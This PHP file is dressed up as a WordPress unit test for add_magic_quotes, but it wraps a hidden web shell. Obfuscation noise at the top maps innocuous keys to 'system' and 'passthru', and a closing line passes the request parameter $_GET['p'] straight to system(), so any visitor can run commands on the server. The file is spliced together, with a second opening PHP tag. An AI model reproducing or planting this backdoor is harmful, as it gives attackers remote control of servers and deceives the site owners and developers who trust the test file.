<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group formatting
 * @group functions
 *
 * @covers ::add_magic_quotes
 */
class Tests_Functions_AddMagicQuotes extends WP_UnitTestCase {

	/**
	 * @ticket 48605
	 *
	 * @dataProvider data_add_magic_quotes
	 *
	 * @param array $test_array Test value.
	 * @param array $expected   Expected return value.
	 */
	public function test_add_magic_quotes( $test_array, $expected ) {
		$this->assertSame( $expected, add_magic_quotes( $test_array ) );
	}

	/**
	 * Data provider for test_add_magic_quotes().
	 *
	 * @return array[] Test parameters {
	 *     @type array $test_array Test value.
	 *     @type array $expected   Expected return value.
	 * }
	 */
	public function data_add_magic_quotes() {
		return array(
			array(
				array(
					'sample string',
					52,
					true,
					false,
					null,
					"This is a 'string'",
					array(
						1,
						false,
						true,
						'This is "another" string',
					),
				),
				array(
					'sample string',
					52,
					true,
					false,
					null,
					"This is a \'string\'",
					array(
						1,
						false,
						true,
						'This is \"another\" string',
					),
				),
			),
		);
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>